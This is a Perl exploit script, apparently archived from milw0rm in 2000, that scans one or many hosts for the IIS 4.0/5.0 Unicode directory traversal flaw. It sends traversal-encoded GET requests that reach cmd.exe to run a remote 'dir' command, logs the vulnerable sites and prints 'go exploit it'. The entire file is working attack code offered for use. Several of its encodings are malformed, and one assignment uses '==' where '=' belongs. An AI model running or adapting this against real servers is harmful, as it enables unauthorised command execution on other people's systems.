#!/usr/bin/perl
#
# IIS 4.0/5.0 Unicode Exploit
# Checks for each script that has been posted on the BugTraq Lis
# Shouts to bighawk(thats for help), datagram, Ghost Rider, The Duke, p4, kript0n and others
# Since It Uses fork(), you gotta keep up with whats happening. Or Just Let it run and it will
# log sites in the log_unicode.log.
# So Simple

# Use Socket
use Socket;

# incase no arguements or less arguements are given
if(@ARGV == '0' || @ARGV < 2) { die "IIS 4.0/5.0 Unicode Exploit\n".
                                     "Programmed by SteeLe\n".
                                     "Usage: ./$0 <single host> <dir for exploit>\n"; }

# Variables
$blah = $ARGV[0];
$port = 80;
$dir = $ARGV[1];
$timeout = 4;

# see if file is there, 
if (-e "$blah") { 
  open(T, "$blah") || die "can't open $blah\n"; 
  @target = <T>;
  close(T);
}

else { @target[0] = $blah; } # what you think is blah

# all scripts mentioned on bugtraq, we know rfp knows more.
@scripts = ("..%c1%1c..", "..%c0%9v..", "..%c0%af..", "..%c0%qf..", "..%c1%8s..", "..%c1%9c..",
"..%c1%pc.."); # blah, i know i'm not l33t

# Open LOG Script
open(LOG, ">>log_unicode.log") || die "couldn't open a file for writing\n";

# Socket Stuff
foreach $script (@scripts) {
  $submit = "GET /scripts/$script/winnt/system32/cmd.exe?/c+dir+$dir HTTP/1.0 \n\r\n\r";
  $ouch = "/scripts/$script/winnt/system32/cmd.exe?/c+dir+$dir";
  foreach $site (@target) {
    unless(fork()) {
      chop($site) if $site =~ /\n$/; &connect($site); 
    } # so i lied
  }
}

sub connect { # real socket stuff
  my ($ste) = @_;
  $iaddr = inet_aton($ste) || die "$ste might not be up, connecting to next site....\n";
  $paddr = sockaddr_in($port, $iaddr);
  $proto = getprotobyname('tcp');
  local $SIG{ALRM} = sub { print "TimeOut On $ste, going to next one....\n" && exit(0) };
  alarm $timeout;
  socket(SCAN, PF_INET, SOCK_STREAM, $proto) || die("Error: couldn't make a socket to $ste");
  connect(SCAN, $paddr) || die "Sorry couldn't connect to $ste, connecting to next site....\n";
  send(SCAN, $submit, 0);
  $blackout = <SCAN>;
  ($http,$code,$blah) == split(/ /, $blackout);
  if ($code == "200") {
    print "$ste has $ouch on there, go exploit it\n"; 
    print LOG "$ste has $ouch on there\n";
  }
  else { print "$ste doesn't have it\n"; }
  close(SCAN);
  exit(0);
}
close(LOG);

# since we're done
exit;


# milw0rm.com [2000-11-18]
